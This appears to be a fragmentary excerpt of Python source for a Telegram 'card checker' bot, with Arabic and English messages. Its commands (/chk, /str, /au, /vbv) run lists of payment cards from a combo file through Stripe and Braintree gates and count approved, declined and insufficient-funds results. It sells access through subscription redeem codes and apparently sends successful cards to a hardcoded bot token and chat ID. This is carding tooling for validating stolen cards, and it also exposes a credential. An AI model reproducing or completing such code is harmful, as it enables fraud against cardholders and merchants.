...
User Bot : @TomeCheckerBot {BL}</b>
    ...
    bot.send_video(
        ...
        video=video_url,
        caption=(
            '𝘾𝙡𝙞𝙘𝙠 /cmds 𝙏𝙤 𝙑𝙞𝙚𝙬 𝙏𝙝𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙊𝙧 𝙎𝙚𝙣𝙙 𝙏𝙝𝙚'
            ' 𝙁𝙞𝙡𝙚 𝘼𝙣𝙙 I 𝑾𝙞𝙡𝙡 𝘾𝙝𝙚𝙘𝙠 𝙄𝙩'
        ),
        reply_markup=keyboard,
    )
...
""",
  ...
  try:
    ...
    contact_button = types.InlineKeyboardButton(
        text='✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨', url='https://t.me/FJ0FF'
    )
    keyboard.add(contact_button, ahmed)
    bot.send_message(
        chat_id=message.chat.id,
...
""",
  ...
  if current_time - provided_time > required_duration:
    ...
    bot.send_message(
        chat_id=message.chat.id,
        text=(
            '<b>لا يمكنك استخدام البوت بسبب انتهاء اشتراكك يرجى التواصل مع'
            ' المالك للتفعل مرى اخرى</b>'
        ),
        reply_markup=keyboard,
    )
    with open('data.json', 'r') as file:
  ...
  stripe_auth_button = types.InlineKeyboardButton(
      text=f'Stripe Auth', callback_data='au_gate'
  )
  keyboard.add(contact_button)
      ...
      with open('combo.txt', 'r') as file:
        ...
        for cc in lino:
          ...
          cm3 = types.InlineKeyboardButton(
              f'• 𝑪𝑯𝑨𝑹𝑮𝑬 ✅ ➜ [ {ch} ] •', callback_data='x'
          )
          ccn = types.InlineKeyboardButton(
              f'• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •', callback_data='x'
          )
          cm4 = types.InlineKeyboardButton(
              f'• 𝘿𝙀𝗖𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •', callback_data='x'
          )
          risk = types.InlineKeyboardButton(
              f'• 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️ ➜ [ {live} ] •', callback_data='x'
          )
    ...
    try:
      with open('combo.txt', 'r') as file:
        ...
        for cc in lino:
          ...
          cm3 = types.InlineKeyboardButton(
              f'• 𝘼𝙋𝙋𝙍𝙊𝑽𝑬𝑫 ✅ ➜ [ {live} ] •', callback_data='x'
          )
          cm4 = types.InlineKeyboardButton(
              f'• 𝘿𝙀𝗖𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •', callback_data='x'
          )
...
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {'{:.1f}'.format(execution_time)} secounds .</b>"""
          ...
          if (
              'Funds' in last
              or 'Invalid postal' in last
              or 'avs' in last
              or 'added' in last
              or 'Duplicate' in last
              or 'live' in last
              or 'success' in last
          ):
            live += 1
    ...
    try:
      with open('combo.txt', 'r') as file:
        ...
        for cc in lino:
          ...
          cm1 = types.InlineKeyboardButton(f'• {cc} •', callback_data='u8')
          status = types.InlineKeyboardButton(
              f'• Response➜ {last} •', callback_data='u8'
          )
          cm3 = types.InlineKeyboardButton(
              f'• Approved ✅ ➜ [ {live} ] •', callback_data='x'
          )
          ccn = types.InlineKeyboardButton(
              f'• CCN ☑️ ➜ [ {ccnn} ] •', callback_data='x'
          )
          cm4 = types.InlineKeyboardButton(
              f'• Declined ❌ ➜ [ {dd} ] •', callback_data='x'
          )
          risk = types.InlineKeyboardButton(
              f'• Risk 🏴‍☠️ ➜ [ {riskk} ] •', callback_data='x'
          )
          cm5 = types.InlineKeyboardButton(
              f'• TOTAL 👻 ➜ [ {total} ] •', callback_data='x'
          )
...
@bot.message_handler(
    func=lambda message: message.text.lower().startswith('.au')
    or message.text.lower().startswith('/au')
)
...
""",
  ...
  if command_usage[idt]['last_time'] is not None:
    ...
    if time_diff < 30:
      bot.reply_to(
          message,
          f'<b>Try again after {30-time_diff} seconds.</b>',
          parse_mode='HTML',
      )
      return
...
@bot.message_handler(
    func=lambda message: message.text.lower().startswith('.chk')
    or message.text.lower().startswith('/chk')
)
def respond_to_vbv(message):
  gate = 'Braintree Auth'
  name = message.from_user.first_name
...
⸙ 𝗕𝗼𝘁 𝗕𝘆: @FJ0FF</b>"""
  if (
      'Funds' in last
      or 'Insufficient Funds' in last
      or 'avs' in last
      or '1000: Approved' in last
      or 'Duplicate' in last
      or 'Approved' in last
  ):
    tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
...
@bot.message_handler(
    func=lambda message: message.text.lower().startswith('.str')
    or message.text.lower().startswith('/str')
)
def respond_to_vbv(message):
  gate = 'stripe charge'
  name = message.from_user.first_name
...
@bot.message_handler(
    func=lambda message: message.text.lower().startswith('.redeem')
    or message.text.lower().startswith('/redeem')
)
def respond_to_vbv(message):
...
نوع الاشتراك {typ}</b>"""
      ...
      bot.reply_to(
          message,
          '<b>Incorrect code or it has already been redeemed </b>',
          parse_mode='HTML',
      )
...
def start(message):
  ...
  def my_function():
    ...
    try:
      ...
      with open('data.json', 'r') as json_file:
        existing_data = json.load(json_file)
      new_data = {pas: {'plan': plan, 'time': ig}}
      existing_data.update(new_data)
      with open('data.json', 'w') as json_file:
        json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
...
@bot.message_handler(
    func=lambda message: message.text.lower().startswith('.vbv')
    or message.text.lower().startswith('/vbv')
)
def respond_to_vbv(message):
  id = message.from_user.id
  name = message.from_user.first_name
...
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {'{:.1f}'.format(execution_time)} secounds .</b>"""
  if (
      'Authenticate Attempt Successful' in last
      or 'Authenticate Successful' in last
      or 'authenticate_successful' in last
  ):
    tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
    acc = '-889876060'
    mg = f"""<b> 
